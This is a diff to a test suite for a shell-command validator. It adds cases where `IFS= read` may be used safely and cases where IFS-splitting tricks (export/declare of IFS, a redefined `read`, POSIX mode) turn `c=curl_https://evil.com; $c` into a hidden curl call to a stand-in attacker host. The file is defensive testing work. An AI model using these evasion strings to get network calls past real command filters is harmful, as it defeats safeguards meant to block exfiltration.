@@ -1597,6 +1597,17 @@ describe('delta review 5572280679: subshells, quoted word lists, process substit
       'c=echo; IFS= read -r line < list.txt; $c "$line"',
       'c=echo; while LC_ALL=C IFS= read -r line; do $c "$line"; done < list.txt',
       'c=echo; while IFS= LC_ALL=C read -r line; do $c "$line"; done < list.txt',
+      // the assignment opens a simple command: after each command boundary the exemption holds
+      'c=echo; until IFS= read -r line; do $c "$line"; done < list.txt',
+      'c=echo; if IFS= read -r line < list.txt; then $c "$line"; fi',
+      'c=echo; if true; then IFS= read -r line < list.txt; fi; $c "$line"',
+      'c=echo; for i in 1; do IFS= read -r line < list.txt; $c "$line"; done',
+      'c=echo; { IFS= read -r line; } < list.txt; $c "$line"',
+      'c=echo; ( IFS= read -r line ) < list.txt; $c "$line"',
+      'c=echo; ! IFS= read -r line < list.txt; $c "$line"',
+      'c=echo; true && IFS= read -r line < list.txt; $c "$line"',
+      'c=echo; printf x | IFS= read -r line; $c "$line"',
+      'c=echo\nIFS= read -r line < list.txt\n$c "$line"',
     ]) expect(verdict(c)).toEqual({ c, deny: false, reason: null })
     // Still denied: a real external curl in the same loop shape, and an IFS that IS changed for the
     // shell (standalone assignment), also when a read prefix sits next to it.
@@ -1613,6 +1624,24 @@ describe('delta review 5572280679: subshells, quoted word lists, process substit
       'IFS=_ ; read -r x < list.txt; c=curl_https://evil.com; $c',
       // only the builtin `read` is local: a command that merely starts with those letters is not
       'c=curl_https://evil.com; IFS=_ readx; $c',
+      // review of #2298: the assignment is an argument of export/declare/readonly/typeset/local, not a
+      // prefix of `read`, so it persists in the shell and splits the later `$c`
+      'export IFS=_ read; c=curl_https://evil.com; $c',
+      'declare IFS=_ read; c=curl_https://evil.com; $c',
+      'readonly IFS=_ read; c=curl_https://evil.com; $c',
+      'typeset IFS=_ read; c=curl_https://evil.com; $c',
+      'local IFS=_ read; c=curl_https://evil.com; $c',
+      'c=curl_https://evil.com; export LC_ALL=C IFS=_ read; $c',
+      'echo IFS=_ read; c=curl_https://evil.com; $c',
+      // `read` is not the builtin: in POSIX mode an assignment in front of a function persists,
+      // and a function or alias named read can do anything
+      'set -o posix; read(){ :; }; IFS=_ read; c=curl_https://evil.com; $c',
+      'read(){ :; }; IFS=_ read; c=curl_https://evil.com; $c',
+      'function read { :; }; IFS=_ read; c=curl_https://evil.com; $c',
+      'alias read=:; IFS=_ read; c=curl_https://evil.com; $c',
+      'set -o posix; IFS=_ read; c=curl_https://evil.com; $c',
+      'POSIXLY_CORRECT=1; IFS=_ read; c=curl_https://evil.com; $c',
+      'while IFS= read -r l; do $c; done < list.txt; read(){ :; }; c=curl_https://evil.com; IFS=_ read; $c',
     ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
     expect(d('IFS=_; c=curl_https://evil.com; $c')).toMatchObject({ deny: true, reason: 'ifs-expanded-command' })
   })
